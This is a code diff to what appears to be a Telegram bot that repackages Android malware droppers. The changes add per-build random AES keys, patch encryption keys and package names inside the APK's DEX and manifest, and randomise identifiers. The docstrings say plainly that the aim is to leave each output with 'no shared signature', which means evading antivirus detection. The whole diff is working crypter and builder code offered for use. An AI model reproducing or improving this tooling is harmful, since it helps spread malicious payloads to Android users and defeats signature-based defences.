@@ -20,9 +20,20 @@ BOT_TOKEN    = os.getenv("BOT_TOKEN", "")
 DROPPER_PATH = Path(__file__).parent / "Viral_Leaks_dropper.apk"
 KEY_PATH     = Path(__file__).parent / "sign.key"
 CERT_PATH    = Path(__file__).parent / "sign.crt"
-AES_KEY_HEX  = "b7fcadb82c9ee0bf873c9c1b670285c22814b69201d01fe640cb2e409131b7f1"
-AES_KEY      = bytes.fromhex(AES_KEY_HEX)
+# Dropper's ORIGINAL embedded key — used only to locate the string in DEX for patching.
+# Every rebuild generates a FRESH random key that replaces this in the built APK.
+DROPPER_AES_KEY_HEX = "b7fcadb82c9ee0bf873c9c1b670285c22814b69201d01fe640cb2e409131b7f1"
+AES_KEY_HEX  = DROPPER_AES_KEY_HEX   # kept for UI display; actual encrypt uses per-rebuild key
 ASSET_NAME   = "assets/Axyra"
+
+# ── New dropper config (com.base.util.apps) ────────────────────────────────────
+# Set NEW_DROPPER_PATH to use the new Java dropper instead of Viral_Leaks.
+# The new dropper stores its key as base64(key XOR 0x55), always 44 chars.
+# Same package suffix scheme: OLD_PKG_NEW = 'com.base.util.apps' (18 chars)
+NEW_DROPPER_PATH  = Path(__file__).parent / "dropper_release.apk"   # built from samples/dropper
+NEW_DROPPER_B64_KEY = "t/ytp2yZiA+H4w5+GyCFzyMUazlYAdAfZA/C4kATG38="  # template key placeholder
+NEW_ASSET_NAME    = "assets/core.dat"
+OLD_PKG_NEW       = "com.base.util.apps"
 
 logging.basicConfig(
     level=logging.INFO,
@@ -245,9 +256,9 @@ awaiting_apk: set[int] = set()
 import string as _string
 import random as _random
 
-def encrypt_payload(data: bytes) -> bytes:
+def _encrypt_payload(data: bytes, key: bytes) -> bytes:
     iv = secrets.token_bytes(16)
-    cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
+    cipher = AES.new(key, AES.MODE_CBC, iv)
     return iv + cipher.encrypt(pad(data, AES.block_size))
 
 OLD_PKG = "com.gdww.ihwc.hpfv"
@@ -359,10 +370,40 @@ def _patch_dex(dex: bytes, new_pkg: str) -> bytes:
     return bytes(result)
 
 
+def _patch_dex_aes_key(dex: bytes, new_key_hex: str) -> bytes:
+    """Replace the 64-char AES key hex string in DEX with a new one.
+
+    The old key is exactly 64 ASCII chars in the DEX string pool.  New key is
+    also 64 chars so ULEB128 length prefix is unchanged — direct byte replace.
+    Recomputes DEX SHA-1 + Adler32 after patching.
+    """
+    old_bytes = DROPPER_AES_KEY_HEX.encode('ascii')
+    new_bytes = new_key_hex.encode('ascii')
+    assert len(old_bytes) == len(new_bytes) == 64
+    result = bytearray(dex)
+    idx = result.find(old_bytes)
+    if idx == -1:
+        log.warning("AES key hex not found in DEX — payload key NOT patched!")
+        return dex
+    result[idx:idx + 64] = new_bytes
+    result[12:32] = hashlib.sha1(bytes(result[32:])).digest()
+    struct.pack_into('<I', result, 8, zlib.adler32(bytes(result[12:])) & 0xFFFFFFFF)
+    log.info("Patched DEX AES key @%d: %s...", idx, new_key_hex[:16])
+    return bytes(result)
+
+
 def rebuild_dropper(payload_bytes: bytes) -> tuple[bytes, str]:
-    """Returns (apk_bytes, pkg_name)."""
-    encrypted = encrypt_payload(payload_bytes)
-    new_pkg   = _random_pkg()
+    """Returns (apk_bytes, pkg_name).
+
+    Generates a fresh random AES-256 key for every rebuild:
+      - DEX hex string is replaced with the new key
+      - Payload is encrypted with the new key
+    Each output APK has a unique key + unique ciphertext → no shared signature.
+    """
+    new_aes_key     = secrets.token_bytes(32)
+    new_aes_key_hex = new_aes_key.hex()
+    encrypted       = _encrypt_payload(payload_bytes, new_aes_key)
+    new_pkg         = _random_pkg()
     buf = io.BytesIO()
     with zipfile.ZipFile(DROPPER_PATH, "r") as zin, \
          zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_STORED) as zout:
@@ -379,6 +420,7 @@ def rebuild_dropper(payload_bytes: bytes) -> tuple[bytes, str]:
                 data = _blank_target_pkg_arsc(data)
             elif item.filename == "classes.dex":
                 data = _patch_dex(data, new_pkg)
+                data = _patch_dex_aes_key(data, new_aes_key_hex)
 
             # 4-byte alignment for STORED entries (zipalign — required by Android)
             if item.compress_type == zipfile.ZIP_STORED:
@@ -390,8 +432,112 @@ def rebuild_dropper(payload_bytes: bytes) -> tuple[bytes, str]:
                 item.extra = b'\x00' * padding
 
             zout.writestr(item, data)
-    log.info("Rebuilt dropper pkg=%s", new_pkg)
+    log.info("Rebuilt dropper pkg=%s key=%s...", new_pkg, new_aes_key_hex[:16])
     return buf.getvalue(), new_pkg
+
+
+def _patch_dex_b64_key(dex: bytes, new_key_hex: str) -> bytes:
+    """Patch base64(key XOR 0x55) in new dropper's DEX.
+
+    New dropper stores the key as base64(key XOR 0x55) — always 44 chars.
+    Bot finds the current template b64 string and replaces with new one.
+    Same length → ULEB128 prefix unchanged.  Recomputes DEX checksums.
+    """
+    new_key  = bytes.fromhex(new_key_hex)
+    xored    = bytes(b ^ 0x55 for b in new_key)
+    new_b64  = base64.b64encode(xored).decode('ascii')  # always 44 chars
+    old_b64  = NEW_DROPPER_B64_KEY
+    assert len(old_b64) == len(new_b64) == 44, "b64 key length mismatch"
+    old_bytes = old_b64.encode('ascii')
+    new_bytes = new_b64.encode('ascii')
+    result    = bytearray(dex)
+    idx       = result.find(old_bytes)
+    if idx == -1:
+        log.warning("b64 key string not found in new dropper DEX — key NOT patched!")
+        return dex
+    result[idx:idx + 44] = new_bytes
+    result[12:32] = hashlib.sha1(bytes(result[32:])).digest()
+    struct.pack_into('<I', result, 8, zlib.adler32(bytes(result[12:])) & 0xFFFFFFFF)
+    log.info("Patched new dropper DEX b64 key @%d", idx)
+    return bytes(result)
+
+
+def rebuild_new_dropper(payload_bytes: bytes) -> tuple[bytes, str]:
+    """Rebuild the new Java dropper (dropper_release.apk).
+
+    Same pipeline as rebuild_dropper but:
+      - Package base is OLD_PKG_NEW = 'com.base.util.apps'
+      - Asset is assets/core.dat
+      - Key is stored as base64(key XOR 0x55) in DEX → patched by _patch_dex_b64_key
+    """
+    if not NEW_DROPPER_PATH.exists():
+        raise FileNotFoundError(f"New dropper not found: {NEW_DROPPER_PATH}")
+
+    new_aes_key     = secrets.token_bytes(32)
+    new_aes_key_hex = new_aes_key.hex()
+    encrypted       = _encrypt_payload(payload_bytes, new_aes_key)
+    # New dropper package randomization — suffix is last 4 chars of OLD_PKG_NEW ('apps')
+    import string as _s, random as _r
+    _al = _s.ascii_lowercase; _an = _s.ascii_lowercase + _s.digits
+    new_suffix = _r.choice(_al) + ''.join(_r.choices(_an, k=3))
+    new_pkg    = f"com.base.util.{new_suffix}"
+    old_pkg    = OLD_PKG_NEW
+
+    buf = io.BytesIO()
+    with zipfile.ZipFile(NEW_DROPPER_PATH, "r") as zin, \
+         zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_STORED) as zout:
+        for item in zin.infolist():
+            if item.filename.startswith("META-INF/"):
+                continue
+            data = zin.read(item)
+            if item.filename == NEW_ASSET_NAME:
+                data = encrypted
+            elif item.filename == "AndroidManifest.xml":
+                data = _patch_pkg_generic(data, old_pkg, new_pkg)
+            elif item.filename == "resources.arsc":
+                data = _patch_pkg_generic(data, old_pkg, new_pkg)
+            elif item.filename == "classes.dex":
+                data = _patch_dex_b64_key(data, new_aes_key_hex)
+
+            if item.compress_type == zipfile.ZIP_STORED:
+                item = _copy.copy(item)
+                fn_enc = item.filename.encode(
+                    'utf-8' if (item.flag_bits & 0x800) else 'cp437'
+                )
+                padding = (-(buf.tell() + 30 + len(fn_enc))) % 4
+                item.extra = b'\x00' * padding
+            zout.writestr(item, data)
+
+    log.info("Rebuilt new dropper pkg=%s key=%s...", new_pkg, new_aes_key_hex[:16])
+    return buf.getvalue(), new_pkg
+
+
+def _patch_pkg_generic(data: bytes, old_pkg: str, new_pkg: str) -> bytes:
+    """UTF-16LE patch of an arbitrary equal-length package name in AXML/arsc."""
+    assert len(old_pkg) == len(new_pkg)
+    old     = old_pkg.encode('utf-16-le')
+    new     = new_pkg.encode('utf-16-le')
+    dot_u16 = b'\x2e\x00'
+    result  = bytearray(data)
+    pos     = 0
+    while True:
+        idx = result.find(old, pos)
+        if idx == -1:
+            break
+        end  = idx + len(old)
+        after = bytes(result[end:end + 2])
+        if after != dot_u16:
+            result[idx:end] = new
+            pos = idx + len(new)
+        else:
+            sc = result[end + 2] if end + 2 < len(result) else 0
+            if 0x61 <= sc <= 0x7a:
+                result[idx:end] = new
+                pos = idx + len(new)
+            else:
+                pos = end
+    return bytes(result)
+
 
 # ─── Keyboards ────────────────────────────────────────────────────────────────
 
